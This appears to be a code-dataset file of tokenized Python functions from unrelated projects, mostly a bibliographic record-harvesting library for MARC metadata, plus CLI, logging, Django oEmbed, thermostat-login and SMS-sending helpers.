def update_thesis_information ( self ) : fields_501 = record_get_field_instances ( self . record , '502' ) for field in fields_501 : new_subs = [ ] for key , value in field [ 0 ] : if key == 'b' : new_subs . append ( ( 'a' , value ) ) elif key == 'c' : new_subs . append ( ( 'b' , value ) ) elif key == 'd' : new_subs . append ( ( 'c' , value ) ) else : new_subs . append ( ( key , value ) ) record_delete_field ( self . record , tag = "502" , field_position_global = field [ 4 ] ) record_add_field ( self . record , "502" , subfields = new_subs )
def update_pagenumber ( self ) : pages = record_get_field_instances ( self . record , '300' ) for field in pages : for idx , ( key , value ) in enumerate ( field [ 0 ] ) : if key == 'a' : field [ 0 ] [ idx ] = ( 'a' , "{0} p" . format ( value ) )
def update_date ( self ) : dates_269 = record_get_field_instances ( self . record , '269' ) for idx , field in enumerate ( dates_269 ) : new_subs = [ ] old_subs = field [ 0 ] for code , value in old_subs : if code == "c" : new_subs . append ( ( "c" , convert_date_from_iso_to_human ( value ) ) ) else : new_subs . append ( ( code , value ) ) dates_269 [ idx ] = field_swap_subfields ( field , new_subs )
def update_date_year ( self ) : dates = record_get_field_instances ( self . record , '260' ) for field in dates : for idx , ( key , value ) in enumerate ( field [ 0 ] ) : if key == 'c' : field [ 0 ] [ idx ] = ( 'c' , value [ : 4 ] ) elif key == 't' : del field [ 0 ] [ idx ] if not dates : published_years = record_get_field_values ( self . record , "773" , code = "y" ) if published_years : record_add_field ( self . record , "260" , subfields = [ ( "c" , published_years [ 0 ] [ : 4 ] ) ] ) else : other_years = record_get_field_values ( self . record , "269" , code = "c" ) if other_years : record_add_field ( self . record , "260" , subfields = [ ( "c" , other_years [ 0 ] [ : 4 ] ) ] )
def fix_name_capitalization ( lastname , givennames ) : lastnames = lastname . split ( ) if len ( lastnames ) == 1 : if '-' in lastname : names = lastname . split ( '-' ) names = map ( lambda a : a [ 0 ] + a [ 1 : ] . lower ( ) , names ) lastname = '-' . join ( names ) else : lastname = lastname [ 0 ] + lastname [ 1 : ] . lower ( ) else : names = [ ] for name in lastnames : if re . search ( r'[A-Z]\.' , name ) : names . append ( name ) else : names . append ( name [ 0 ] + name [ 1 : ] . lower ( ) ) lastname = ' ' . join ( names ) lastname = collapse_initials ( lastname ) names = [ ] for name in givennames : if re . search ( r'[A-Z]\.' , name ) : names . append ( name ) else : names . append ( name [ 0 ] + name [ 1 : ] . lower ( ) ) givennames = ' ' . join ( names ) return lastname , givennames
def autodiscover ( ) : import imp from django . conf import settings for app in settings . INSTALLED_APPS : try : app_path = __import__ ( app , { } , { } , [ app . split ( '.' ) [ - 1 ] ] ) . __path__ except AttributeError : continue try : imp . find_module ( 'oembed_providers' , app_path ) except ImportError : continue __import__ ( "%s.oembed_providers" % app )
def select ( options = None ) : if not options : return None width = len ( str ( len ( options ) ) ) for x , option in enumerate ( options ) : sys . stdout . write ( '{:{width}}) {}\n' . format ( x + 1 , option , width = width ) ) sys . stdout . write ( '{:>{width}} ' . format ( '#?' , width = width + 1 ) ) sys . stdout . flush ( ) if sys . stdin . isatty ( ) : # regular prompt try : response = raw_input ( ) . strip ( ) except ( EOFError , KeyboardInterrupt ) : # handle ctrl-d, ctrl-c response = '' else : # try connecting to current tty, when using pipes sys . stdin = open ( "/dev/tty" ) try : response = '' while True : response += sys . stdin . read ( 1 ) if response . endswith ( '\n' ) : break except ( EOFError , KeyboardInterrupt ) : sys . stdout . flush ( ) pass try : response = int ( response ) - 1 except ValueError : return None if response < 0 or response >= len ( options ) : return None return options [ response ]
def err ( format_msg , * args , * * kwargs ) : exc_info = kwargs . pop ( "exc_info" , False ) stderr . warning ( str ( format_msg ) . format ( * args , * * kwargs ) , exc_info = exc_info )
def out ( format_msg = "" , * args , * * kwargs ) : logmethod = kwargs . get ( "logmethod" , stdout . info ) if format_msg != "" : if Prefix . has ( ) : if isinstance ( format_msg , basestring ) : format_msg = Prefix . get ( ) + format_msg else : format_msg = Prefix . get ( ) + str ( format_msg ) if isinstance ( format_msg , basestring ) : if args or kwargs : s = format_msg . format ( * args , * * kwargs ) else : s = format_msg logmethod ( s ) #             width = globals()["width"] #             s = textwrap.fill(s, width=width) #             stdout.info(s) else : logmethod ( str ( format_msg ) ) else : logmethod ( "" )
def verbose ( format_msg = "" , * args , * * kwargs ) : kwargs [ "logmethod" ] = stdout . debug out ( format_msg , * args , * * kwargs )
def inject_quiet ( levels ) : loggers = list ( Logger . manager . loggerDict . items ( ) ) loggers . append ( ( "root" , getLogger ( ) ) ) level_filter = LevelFilter ( levels ) for logger_name , logger in loggers : for handler in getattr ( logger , "handlers" , [ ] ) : handler . addFilter ( level_filter )
def connect ( self ) : for tried_connection_count in range ( CFG_FTP_CONNECTION_ATTEMPTS ) : try : self . ftp = FtpHandler ( self . config . OXFORD . URL , self . config . OXFORD . LOGIN , self . config . OXFORD . PASSWORD ) self . logger . debug ( ( "Successful connection to the " "Oxford University Press server" ) ) return except socket_timeout_exception as err : self . logger . error ( ( 'Failed to connect %d of %d times. ' 'Will sleep for %d seconds and try again.' ) % ( tried_connection_count + 1 , CFG_FTP_CONNECTION_ATTEMPTS , CFG_FTP_TIMEOUT_SLEEP_DURATION ) ) time . sleep ( CFG_FTP_TIMEOUT_SLEEP_DURATION ) except Exception as err : self . logger . error ( ( 'Failed to connect to the Oxford ' 'University Press server. %s' ) % ( err , ) ) break raise LoginException ( err )
def _extract_packages ( self ) : if not hasattr ( self , "retrieved_packages_unpacked" ) : self . retrieved_packages_unpacked = [ self . package_name ] for path in self . retrieved_packages_unpacked : package_name = basename ( path ) self . path_unpacked = join ( CFG_UNPACKED_FILES , package_name . split ( '.' ) [ 0 ] ) self . logger . debug ( "Extracting package: %s" % ( path . split ( "/" ) [ - 1 ] , ) ) try : if "_archival_pdf" in self . path_unpacked : self . path_unpacked = ( self . path_unpacked . rstrip ( "_archival_pdf" ) ) ZipFile ( path ) . extractall ( join ( self . path_unpacked , "archival_pdfs" ) ) else : ZipFile ( path ) . extractall ( self . path_unpacked ) #TarFile.open(path).extractall(self.path_unpacked) except Exception : register_exception ( alert_admin = True , prefix = "OUP error extracting package." ) self . logger . error ( "Error extraction package file: %s" % ( path , ) ) if hasattr ( self , "path_unpacked" ) : return self . path_unpacked
def authenticate ( self ) : if self . _session_id : _LOGGER . debug ( "Using existing NuHeat session" ) return _LOGGER . debug ( "Creating NuHeat session" ) post_data = { "Email" : self . username , "Password" : self . password , "application" : "0" } data = self . request ( config . AUTH_URL , method = "POST" , data = post_data ) session_id = data . get ( "SessionId" ) if not session_id : raise Exception ( "Authentication error" ) self . _session_id = session_id
def handle_starttag ( self , tag , attrs ) : if tag in self . mathml_elements : final_attr = "" for key , value in attrs : final_attr += ' {0}="{1}"' . format ( key , value ) self . fed . append ( "<{0}{1}>" . format ( tag , final_attr ) )
def handle_endtag ( self , tag ) : if tag in self . mathml_elements : self . fed . append ( "</{0}>" . format ( tag ) )
def html_to_text ( cls , html ) : s = cls ( ) s . feed ( html ) unescaped_data = s . unescape ( s . get_data ( ) ) return escape_for_xml ( unescaped_data , tags_to_keep = s . mathml_elements )
def is_instance ( self ) : ret = False val = self . callback if self . is_class ( ) : return False ret = not inspect . isfunction ( val ) and not inspect . ismethod ( val ) #         if is_py2: #             ret = isinstance(val, types.InstanceType) or hasattr(val, '__dict__') \ #                 and not (hasattr(val, 'func_name') or hasattr(val, 'im_func')) #  #         else: #             ret = not inspect.isfunction(val) and not inspect.ismethod(val) return ret
def is_function ( self ) : if self . is_instance ( ) or self . is_class ( ) : return False return isinstance ( self . callback , ( Callable , classmethod ) )
def make_user_agent ( component = None ) : packageinfo = pkg_resources . require ( "harvestingkit" ) [ 0 ] useragent = "{0}/{1}" . format ( packageinfo . project_name , packageinfo . version ) if component is not None : useragent += " {0}" . format ( component ) return useragent
def record_add_field ( rec , tag , ind1 = '' , ind2 = '' , subfields = [ ] , controlfield_value = '' ) : if controlfield_value : doc = etree . Element ( "controlfield" , attrib = { "tag" : tag , } ) doc . text = unicode ( controlfield_value ) else : doc = etree . Element ( "datafield" , attrib = { "tag" : tag , "ind1" : ind1 , "ind2" : ind2 , } ) for code , value in subfields : field = etree . SubElement ( doc , "subfield" , attrib = { "code" : code } ) field . text = value rec . append ( doc ) return rec
def record_xml_output ( rec , pretty = True ) : from . html_utils import MathMLParser ret = etree . tostring ( rec , xml_declaration = False ) # Special MathML handling ret = re . sub ( "(&lt;)(([\/]?{0}))" . format ( "|[\/]?" . join ( MathMLParser . mathml_elements ) ) , '<\g<2>' , ret ) ret = re . sub ( "&gt;" , '>' , ret ) if pretty : # We are doing our own prettyfication as etree pretty_print is too insane. ret = ret . replace ( '</datafield>' , '  </datafield>\n' ) ret = re . sub ( r'<datafield(.*?)>' , r'  <datafield\1>\n' , ret ) ret = ret . replace ( '</subfield>' , '</subfield>\n' ) ret = ret . replace ( '<subfield' , '    <subfield' ) ret = ret . replace ( 'record>' , 'record>\n' ) return ret
def format_arxiv_id ( arxiv_id ) : if arxiv_id and "/" not in arxiv_id and "arXiv" not in arxiv_id : return "arXiv:%s" % ( arxiv_id , ) elif arxiv_id and '.' not in arxiv_id and arxiv_id . lower ( ) . startswith ( 'arxiv:' ) : return arxiv_id [ 6 : ] # strip away arxiv: for old identifiers else : return arxiv_id
def fix_journal_name ( journal , knowledge_base ) : if not journal : return '' , '' if not knowledge_base : return journal , '' if len ( journal ) < 2 : return journal , '' volume = '' if ( journal [ - 1 ] <= 'Z' and journal [ - 1 ] >= 'A' ) and ( journal [ - 2 ] == '.' or journal [ - 2 ] == ' ' ) : volume += journal [ - 1 ] journal = journal [ : - 1 ] journal = journal . strip ( ) if journal . upper ( ) in knowledge_base : journal = knowledge_base [ journal . upper ( ) ] . strip ( ) elif journal in knowledge_base : journal = knowledge_base [ journal ] . strip ( ) elif '.' in journal : journalnodots = journal . replace ( '. ' , ' ' ) journalnodots = journalnodots . replace ( '.' , ' ' ) . strip ( ) . upper ( ) if journalnodots in knowledge_base : journal = knowledge_base [ journalnodots ] . strip ( ) journal = journal . replace ( '. ' , '.' ) return journal , volume
def add_nations_field ( authors_subfields ) : from . config import NATIONS_DEFAULT_MAP result = [ ] for field in authors_subfields : if field [ 0 ] == 'v' : values = [ x . replace ( '.' , '' ) for x in field [ 1 ] . split ( ', ' ) ] possible_affs = filter ( lambda x : x is not None , map ( NATIONS_DEFAULT_MAP . get , values ) ) if 'CERN' in possible_affs and 'Switzerland' in possible_affs : # Don't use remove in case of multiple Switzerlands possible_affs = [ x for x in possible_affs if x != 'Switzerland' ] result . extend ( possible_affs ) result = sorted ( list ( set ( result ) ) ) if result : authors_subfields . extend ( [ ( 'w' , res ) for res in result ] ) else : authors_subfields . append ( ( 'w' , 'HUMAN CHECK' ) )
def fix_dashes ( string ) : string = string . replace ( u'\u05BE' , '-' ) string = string . replace ( u'\u1806' , '-' ) string = string . replace ( u'\u2E3A' , '-' ) string = string . replace ( u'\u2E3B' , '-' ) string = unidecode ( string ) return re . sub ( r'--+' , '-' , string )
def fix_title_capitalization ( title ) : if re . search ( "[A-Z]" , title ) and re . search ( "[a-z]" , title ) : return title word_list = re . split ( ' +' , title ) final = [ word_list [ 0 ] . capitalize ( ) ] for word in word_list [ 1 : ] : if word . upper ( ) in COMMON_ACRONYMS : final . append ( word . upper ( ) ) elif len ( word ) > 3 : final . append ( word . capitalize ( ) ) else : final . append ( word . lower ( ) ) return " " . join ( final )
def convert_html_subscripts_to_latex ( text ) : text = re . sub ( "<sub>(.*?)</sub>" , r"$_{\1}$" , text ) text = re . sub ( "<sup>(.*?)</sup>" , r"$^{\1}$" , text ) return text
def download_file ( from_url , to_filename = None , chunk_size = 1024 * 8 , retry_count = 3 ) : if not to_filename : to_filename = get_temporary_file ( ) session = requests . Session ( ) adapter = requests . adapters . HTTPAdapter ( max_retries = retry_count ) session . mount ( from_url , adapter ) response = session . get ( from_url , stream = True ) with open ( to_filename , 'wb' ) as fd : for chunk in response . iter_content ( chunk_size ) : fd . write ( chunk ) return to_filename
def run_shell_command ( commands , * * kwargs ) : p = subprocess . Popen ( commands , stdout = subprocess . PIPE , stderr = subprocess . PIPE , * * kwargs ) output , error = p . communicate ( ) return p . returncode , output , error
def create_logger ( name , filename = None , logging_level = logging . DEBUG ) : logger = logging . getLogger ( name ) formatter = logging . Formatter ( ( '%(asctime)s - %(name)s - ' '%(levelname)-8s - %(message)s' ) ) if filename : fh = logging . FileHandler ( filename = filename ) fh . setFormatter ( formatter ) logger . addHandler ( fh ) ch = logging . StreamHandler ( ) ch . setFormatter ( formatter ) logger . addHandler ( ch ) logger . setLevel ( logging_level ) return logger
def _do_unzip ( zipped_file , output_directory ) : z = zipfile . ZipFile ( zipped_file ) for path in z . namelist ( ) : relative_path = os . path . join ( output_directory , path ) dirname , dummy = os . path . split ( relative_path ) try : if relative_path . endswith ( os . sep ) and not os . path . exists ( dirname ) : os . makedirs ( relative_path ) elif not os . path . exists ( relative_path ) : dirname = os . path . join ( output_directory , os . path . dirname ( path ) ) if os . path . dirname ( path ) and not os . path . exists ( dirname ) : os . makedirs ( dirname ) fd = open ( relative_path , "w" ) fd . write ( z . read ( path ) ) fd . close ( ) except IOError , e : raise e return output_directory
def locate ( pattern , root = os . curdir ) : for path , dummy , files in os . walk ( os . path . abspath ( root ) ) : for filename in fnmatch . filter ( files , pattern ) : yield os . path . join ( path , filename )
def convert_date_to_iso ( value ) : date_formats = [ "%d %b %Y" , "%Y/%m/%d" ] for dformat in date_formats : try : date = datetime . strptime ( value , dformat ) return date . strftime ( "%Y-%m-%d" ) except ValueError : pass return value
def convert_date_from_iso_to_human ( value ) : try : year , month , day = value . split ( "-" ) except ValueError : # Not separated by "-". Space? try : year , month , day = value . split ( " " ) except ValueError : # What gives? OK, lets just return as is return value try : date_object = datetime ( int ( year ) , int ( month ) , int ( day ) ) except TypeError : return value return date_object . strftime ( "%d %b %Y" )
def get_temporary_file ( prefix = "tmp_" , suffix = "" , directory = None ) : try : file_fd , filepath = mkstemp ( prefix = prefix , suffix = suffix , dir = directory ) os . close ( file_fd ) except IOError , e : try : os . remove ( filepath ) except Exception : pass raise e return filepath
def return_letters_from_string ( text ) : out = "" for letter in text : if letter . isalpha ( ) : out += letter return out
def license_is_oa ( license ) : for oal in OA_LICENSES : if re . search ( oal , license ) : return True return False
def _extract_package ( self ) : self . path = mkdtemp ( prefix = "scoap3_package_" , dir = CFG_TMPSHAREDDIR ) self . logger . debug ( "Extracting package: %s" % ( self . package_name , ) ) scoap3utils_extract_package ( self . package_name , self . path , self . logger )
def get_publication_date ( self , xml_doc ) : start_date = get_value_in_tag ( xml_doc , "prism:coverDate" ) if not start_date : start_date = get_value_in_tag ( xml_doc , "prism:coverDisplayDate" ) if not start_date : start_date = get_value_in_tag ( xml_doc , 'oa:openAccessEffective' ) if start_date : start_date = datetime . datetime . strptime ( start_date , "%Y-%m-%dT%H:%M:%SZ" ) return start_date . strftime ( "%Y-%m-%d" ) import dateutil . parser #dateutil.parser.parse cant process dates like April-June 2016 start_date = re . sub ( '([A-Z][a-z]+)[\s\-][A-Z][a-z]+ (\d{4})' , r'\1 \2' , start_date ) try : date = dateutil . parser . parse ( start_date ) except ValueError : return '' # Special case where we ignore the deduced day form dateutil # in case it was not given in the first place. if len ( start_date . split ( " " ) ) == 3 : return date . strftime ( "%Y-%m-%d" ) else : return date . strftime ( "%Y-%m" ) else : if len ( start_date ) is 8 : start_date = time . strftime ( '%Y-%m-%d' , time . strptime ( start_date , '%Y%m%d' ) ) elif len ( start_date ) is 6 : start_date = time . strftime ( '%Y-%m' , time . strptime ( start_date , '%Y%m' ) ) return start_date
def parser ( self ) : module = self . module subcommands = self . subcommands if subcommands : module_desc = inspect . getdoc ( module ) parser = Parser ( description = module_desc , module = module ) subparsers = parser . add_subparsers ( ) for sc_name , callback in subcommands . items ( ) : sc_name = sc_name . replace ( "_" , "-" ) cb_desc = inspect . getdoc ( callback ) sc_parser = subparsers . add_parser ( sc_name , callback = callback , help = cb_desc ) else : parser = Parser ( callback = self . callbacks [ self . function_name ] , module = module ) return parser
def module ( self ) : # we have to guard this value because: # https://thingspython.wordpress.com/2010/09/27/another-super-wrinkle-raising-typeerror/ if not hasattr ( self , '_module' ) : if "__main__" in sys . modules : mod = sys . modules [ "__main__" ] path = self . normalize_path ( mod . __file__ ) if os . path . splitext ( path ) == os . path . splitext ( self . path ) : self . _module = mod else : # http://stackoverflow.com/questions/67631/how-to-import-a-module-given-the-full-path self . _module = imp . load_source ( 'captain_script' , self . path ) #self._module = imp.load_source(self.module_name, self.path) return self . _module
def body ( self ) : if not hasattr ( self , '_body' ) : self . _body = inspect . getsource ( self . module ) return self . _body
def run ( self , raw_args ) : parser = self . parser args , kwargs = parser . parse_callback_args ( raw_args ) callback = kwargs . pop ( "main_callback" ) if parser . has_injected_quiet ( ) : levels = kwargs . pop ( "quiet_inject" , "" ) logging . inject_quiet ( levels ) try : ret_code = callback ( * args , * * kwargs ) ret_code = int ( ret_code ) if ret_code else 0 except ArgError as e : # https://hg.python.org/cpython/file/2.7/Lib/argparse.py#l2374 echo . err ( "{}: error: {}" , parser . prog , str ( e ) ) ret_code = 2 return ret_code
def can_run_from_cli ( self ) : ret = False ast_tree = ast . parse ( self . body , self . path ) calls = self . _find_calls ( ast_tree , __name__ , "exit" ) for call in calls : if re . search ( "{}\(" . format ( re . escape ( call ) ) , self . body ) : ret = True break return ret
def mock_request ( ) : current_site = Site . objects . get_current ( ) request = HttpRequest ( ) request . META [ 'SERVER_NAME' ] = current_site . domain return request
def get_record ( self ) : self . update_system_numbers ( ) self . add_systemnumber ( "CDS" ) self . fields_list = [ "024" , "041" , "035" , "037" , "088" , "100" , "110" , "111" , "242" , "245" , "246" , "260" , "269" , "300" , "502" , "650" , "653" , "693" , "700" , "710" , "773" , "856" , "520" , "500" , "980" ] self . keep_only_fields ( ) self . determine_collections ( ) self . add_cms_link ( ) self . update_languages ( ) self . update_reportnumbers ( ) self . update_date ( ) self . update_pagenumber ( ) self . update_authors ( ) self . update_subject_categories ( "SzGeCERN" , "INSPIRE" , "categories_inspire" ) self . update_keywords ( ) self . update_experiments ( ) self . update_collaboration ( ) self . update_journals ( ) self . update_links_and_ffts ( ) if 'THESIS' in self . collections : self . update_thesis_supervisors ( ) self . update_thesis_information ( ) if 'NOTE' in self . collections : self . add_notes ( ) for collection in self . collections : record_add_field ( self . record , tag = '980' , subfields = [ ( 'a' , collection ) ] ) self . remove_controlfields ( ) return self . record
def determine_collections ( self ) : for value in record_get_field_values ( self . record , '980' , code = 'a' ) : if 'NOTE' in value . upper ( ) : self . collections . add ( 'NOTE' ) if 'THESIS' in value . upper ( ) : self . collections . add ( 'THESIS' ) if 'CONFERENCEPAPER' in value . upper ( ) : self . collections . add ( 'ConferencePaper' ) if "HIDDEN" in value . upper ( ) : self . hidden = True if self . is_published ( ) : self . collections . add ( "PUBLISHED" ) self . collections . add ( "CITEABLE" ) if 'NOTE' not in self . collections : from itertools import product # TODO: Move this to a KB kb = [ 'ATLAS-CONF-' , 'CMS-PAS-' , 'ATL-' , 'CMS-DP-' , 'ALICE-INT-' , 'LHCb-PUB-' ] values = record_get_field_values ( self . record , "088" , code = 'a' ) for val , rep in product ( values , kb ) : if val . startswith ( rep ) : self . collections . add ( 'NOTE' ) break # 980 Arxiv tag if record_get_field_values ( self . record , '035' , filter_subfield_code = "a" , filter_subfield_value = "arXiv" ) : self . collections . add ( "arXiv" ) # 980 HEP && CORE self . collections . add ( 'HEP' ) self . collections . add ( 'CORE' ) # 980 Conference Note if 'ConferencePaper' not in self . collections : for value in record_get_field_values ( self . record , tag = '962' , code = 'n' ) : if value [ - 2 : ] . isdigit ( ) : self . collections . add ( 'ConferencePaper' ) break # Clear out any existing ones. record_delete_fields ( self . record , "980" )
def add_cms_link ( self ) : intnote = record_get_field_values ( self . record , '690' , filter_subfield_code = "a" , filter_subfield_value = 'INTNOTE' ) if intnote : val_088 = record_get_field_values ( self . record , tag = '088' , filter_subfield_code = "a" ) for val in val_088 : if 'CMS' in val : url = ( 'http://weblib.cern.ch/abstract?CERN-CMS' + val . split ( 'CMS' , 1 ) [ - 1 ] ) record_add_field ( self . record , tag = '856' , ind1 = '4' , subfields = [ ( 'u' , url ) ] )
def update_date ( self ) : for field in record_get_field_instances ( self . record , '269' ) : for idx , ( key , value ) in enumerate ( field [ 0 ] ) : if key == "c" : field [ 0 ] [ idx ] = ( "c" , convert_date_to_iso ( value ) ) record_delete_fields ( self . record , "260" ) if 'THESIS' not in self . collections : for field in record_get_field_instances ( self . record , '260' ) : record_add_field ( self . record , '269' , subfields = field [ 0 ] ) record_delete_fields ( self . record , '260' )
def update_pagenumber ( self ) : for field in record_get_field_instances ( self . record , '300' ) : for idx , ( key , value ) in enumerate ( field [ 0 ] ) : if key == 'a' : if "mult." not in value and value != " p" : field [ 0 ] [ idx ] = ( 'a' , re . sub ( r'[^\d-]+' , '' , value ) ) else : record_delete_field ( self . record , '300' , field_position_global = field [ 4 ] ) break
def update_authors ( self ) : author_names = record_get_field_instances ( self . record , '100' ) author_names . extend ( record_get_field_instances ( self . record , '700' ) ) for field in author_names : subs = field_get_subfields ( field ) if 'i' not in subs or 'XX' in subs [ 'i' ] : if 'j' not in subs or 'YY' in subs [ 'j' ] : for idx , ( key , value ) in enumerate ( field [ 0 ] ) : if key == 'a' : field [ 0 ] [ idx ] = ( 'a' , punctuate_authorname ( value ) )
def update_thesis_information ( self ) : fields_501 = record_get_field_instances ( self . record , '502' ) for idx , field in enumerate ( fields_501 ) : new_subs = [ ] for key , value in field [ 0 ] : if key == 'a' : new_subs . append ( ( 'b' , value ) ) elif key == 'b' : new_subs . append ( ( 'c' , value ) ) elif key == 'c' : new_subs . append ( ( 'd' , value ) ) else : new_subs . append ( ( key , value ) ) fields_501 [ idx ] = field_swap_subfields ( field , new_subs )
def update_keywords ( self ) : for field in record_get_field_instances ( self . record , '653' , ind1 = '1' ) : subs = field_get_subfields ( field ) new_subs = [ ] if 'a' in subs : for val in subs [ 'a' ] : new_subs . extend ( [ ( '9' , 'author' ) , ( 'a' , val ) ] ) new_field = create_field ( subfields = new_subs , ind1 = '1' ) record_replace_field ( self . record , '653' , new_field , field_position_global = field [ 4 ] )
def update_journals ( self ) : for field in record_get_field_instances ( self . record , '773' ) : subs = field_get_subfield_instances ( field ) new_subs = [ ] for idx , ( key , value ) in enumerate ( subs ) : if key == 'p' : journal_name = self . get_config_item ( value , "journals" , allow_substring = False ) journal_name = journal_name . replace ( '. ' , '.' ) . strip ( ) new_subs . append ( ( key , journal_name ) ) else : new_subs . append ( ( key , value ) ) record_delete_field ( self . record , tag = "773" , field_position_global = field [ 4 ] ) record_add_field ( self . record , "773" , subfields = new_subs )
def _extract_packages ( self ) : self . path_unpacked = [ ] if not hasattr ( self , "retrieved_packages_unpacked" ) : self . retrieved_packages_unpacked = [ self . package_name ] for path in self . retrieved_packages_unpacked : self . logger . debug ( "Extracting package: %s" % ( path , ) ) p_name = 'EPJC' if 'EPJC' in path else 'JHEP' p_message = 'scoap3_package_%s_%s_' % ( p_name , datetime . now ( ) ) self . path_unpacked . append ( mkdtemp ( prefix = p_message , dir = CFG_TMPSHAREDDIR ) ) try : ZipFile ( path ) . extractall ( self . path_unpacked [ - 1 ] ) except Exception : register_exception ( alert_admin = True , prefix = "Springer error extracting package." ) self . logger . error ( "Error extraction package file: %s" % ( path , ) ) return self . path_unpacked
def record_delete_subfield ( rec , tag , subfield_code , ind1 = ' ' , ind2 = ' ' ) : ind1 , ind2 = _wash_indicators ( ind1 , ind2 ) for field in rec . get ( tag , [ ] ) : if field [ 1 ] == ind1 and field [ 2 ] == ind2 : field [ 0 ] [ : ] = [ subfield for subfield in field [ 0 ] if subfield_code != subfield [ 0 ] ]
def record_replace_field ( rec , tag , new_field , field_position_global = None , field_position_local = None ) : if field_position_global is None and field_position_local is None : raise InvenioBibRecordFieldError ( "A field position is required to " "complete this operation." ) elif field_position_global is not None and field_position_local is not None : raise InvenioBibRecordFieldError ( "Only one field position is required " "to complete this operation." ) elif field_position_global : if tag not in rec : raise InvenioBibRecordFieldError ( "No tag '%s' in record." % tag ) replaced = False for position , field in enumerate ( rec [ tag ] ) : if field [ 4 ] == field_position_global : rec [ tag ] [ position ] = new_field replaced = True if not replaced : raise InvenioBibRecordFieldError ( "No field has the tag '%s' and " "the global field position '%d'." % ( tag , field_position_global ) ) else : try : rec [ tag ] [ field_position_local ] = new_field except KeyError : raise InvenioBibRecordFieldError ( "No tag '%s' in record." % tag ) except IndexError : raise InvenioBibRecordFieldError ( "No field has the tag '%s' and " "the local field position '%d'." % ( tag , field_position_local ) )
def record_modify_controlfield ( rec , tag , controlfield_value , field_position_global = None , field_position_local = None ) : field = record_get_field ( rec , tag , field_position_global = field_position_global , field_position_local = field_position_local ) new_field = ( field [ 0 ] , field [ 1 ] , field [ 2 ] , controlfield_value , field [ 4 ] ) record_replace_field ( rec , tag , new_field , field_position_global = field_position_global , field_position_local = field_position_local )
def field_xml_output ( field , tag ) : marcxml = [ ] if field [ 3 ] : marcxml . append ( '  <controlfield tag="%s">%s</controlfield>' % ( tag , MathMLParser . html_to_text ( field [ 3 ] ) ) ) else : marcxml . append ( '  <datafield tag="%s" ind1="%s" ind2="%s">' % ( tag , field [ 1 ] , field [ 2 ] ) ) marcxml += [ _subfield_xml_output ( subfield ) for subfield in field [ 0 ] ] marcxml . append ( '  </datafield>' ) return '\n' . join ( marcxml )
def record_strip_empty_volatile_subfields ( rec ) : for tag in rec . keys ( ) : for field in rec [ tag ] : field [ 0 ] [ : ] = [ subfield for subfield in field [ 0 ] if subfield [ 1 ] [ : 9 ] != "VOLATILE:" ]
def record_make_all_subfields_volatile ( rec ) : for tag in rec . keys ( ) : for field_position , field in enumerate ( rec [ tag ] ) : for subfield_position , subfield in enumerate ( field [ 0 ] ) : if subfield [ 1 ] [ : 9 ] != "VOLATILE:" : record_modify_subfield ( rec , tag , subfield [ 0 ] , "VOLATILE:" + subfield [ 1 ] , subfield_position , field_position_local = field_position )
def _record_sort_by_indicators ( record ) : for tag , fields in record . items ( ) : record [ tag ] = _fields_sort_by_indicators ( fields )
def _get_children_by_tag_name ( node , name ) : try : return [ child for child in node . childNodes if child . nodeName == name ] except TypeError : return [ ]
def parse ( self , path_to_xml = None ) : if not path_to_xml : if not self . path : self . logger . error ( "No path defined!" ) return path_to_xml = self . path root = self . _clean_xml ( path_to_xml ) # See first of this XML is clean or OAI request if root . tag . lower ( ) == 'collection' : tree = ET . ElementTree ( root ) self . records = element_tree_collection_to_records ( tree ) elif root . tag . lower ( ) == 'record' : new_root = ET . Element ( 'collection' ) new_root . append ( root ) tree = ET . ElementTree ( new_root ) self . records = element_tree_collection_to_records ( tree ) else : # We have an OAI request header_subs = get_request_subfields ( root ) records = root . find ( 'ListRecords' ) if records is None : records = root . find ( 'GetRecord' ) if records is None : raise ValueError ( "Cannot find ListRecords or GetRecord!" ) tree = ET . ElementTree ( records ) for record , is_deleted in element_tree_oai_records ( tree , header_subs ) : if is_deleted : # It was OAI deleted. Create special record self . deleted_records . append ( self . create_deleted_record ( record ) ) else : self . records . append ( record )
def create_deleted_record ( self , record ) : identifier = record_get_field_value ( record , tag = "037" , code = "a" ) recid = identifier . split ( ":" ) [ - 1 ] try : source = identifier . split ( ":" ) [ 1 ] except IndexError : source = "Unknown" record_add_field ( record , "035" , subfields = [ ( "9" , source ) , ( "a" , recid ) ] ) record_add_field ( record , "980" , subfields = [ ( "c" , "DELETED" ) ] ) return record
def _login ( self , session , get_request = False ) : req = session . post ( self . _login_url , data = self . _logindata ) if _LOGIN_ERROR_STRING in req . text or req . status_code == 403 or req . url == _LOGIN_URL : err_mess = "YesssSMS: login failed, username or password wrong" if _LOGIN_LOCKED_MESS in req . text : err_mess += ", page says: " + _LOGIN_LOCKED_MESS_ENG self . _suspended = True raise self . AccountSuspendedError ( err_mess ) raise self . LoginError ( err_mess ) self . _suspended = False # login worked return ( session , req ) if get_request else session
def login_data_valid ( self ) : login_working = False try : with self . _login ( requests . Session ( ) ) as sess : sess . get ( self . _logout_url ) except self . LoginError : pass else : login_working = True return login_working
def send ( self , recipient , message ) : if self . _logindata [ 'login_rufnummer' ] is None or self . _logindata [ 'login_passwort' ] is None : err_mess = "YesssSMS: Login data required" raise self . LoginError ( err_mess ) if not recipient : raise self . NoRecipientError ( "YesssSMS: recipient number missing" ) if not isinstance ( recipient , str ) : raise ValueError ( "YesssSMS: str expected as recipient number" ) if not message : raise self . EmptyMessageError ( "YesssSMS: message is empty" ) with self . _login ( requests . Session ( ) ) as sess : sms_data = { 'to_nummer' : recipient , 'nachricht' : message } req = sess . post ( self . _websms_url , data = sms_data ) if not ( req . status_code == 200 or req . status_code == 302 ) : raise self . SMSSendingError ( "YesssSMS: error sending SMS" ) if _UNSUPPORTED_CHARS_STRING in req . text : raise self . UnsupportedCharsError ( "YesssSMS: message contains unsupported character(s)" ) if _SMS_SENDING_SUCCESSFUL_STRING not in req . text : raise self . SMSSendingError ( "YesssSMS: error sending SMS" ) sess . get ( self . _logout_url )
def get_date ( self , filename ) : try : self . document = parse ( filename ) return self . _get_date ( ) except DateNotFoundException : print ( "Date problem found in {0}" . format ( filename ) ) return datetime . datetime . strftime ( datetime . datetime . now ( ) , "%Y-%m-%d" )
